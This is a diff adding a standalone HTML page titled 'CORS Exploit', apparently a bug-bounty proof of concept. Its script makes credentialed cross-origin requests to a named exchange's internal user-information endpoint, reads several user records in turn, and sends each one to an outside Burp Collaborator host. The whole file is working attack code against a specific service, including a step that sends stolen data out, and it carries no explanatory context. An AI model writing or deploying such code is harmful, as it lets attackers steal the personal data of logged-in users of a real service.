@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit</title>
+</head>
+<body>
+    <script>
+        async function fetchUserInformation(userId) {
+            const response = await fetch(`https://csboss.okex.org/newboss/okboss/user/userInformationAll?userId=${userId}`, { credentials: 'include' });
+            if (response.ok) {
+                const userData = await response.json();
+                return userData;
+            } else {
+                return null;
+            }
+        }
+
+        async function fetchLimitedUsers() {
+            const maxRequests = 5;
+            const users = [];
+
+            for (let userId = 1; userId <= maxRequests; userId++) {
+                const userData = await fetchUserInformation(userId);
+                if (userData) {
+                    users.push(userData);
+                }
+            }
+
+            return users;
+        }
+
+        fetchLimitedUsers().then(users => {
+            users.forEach(user => {
+                // Log the user data to Burp Collaborator
+                fetch('https://8r0150yoonqzfx1b1j54dmrbf2lt9q5eu.oastify.com/log?key=' + JSON.stringify(user));
+            });
+        }).catch(error => {
+            console.error('Error fetching users:', error);
+        });
+    </script>
+</body>
+</html>
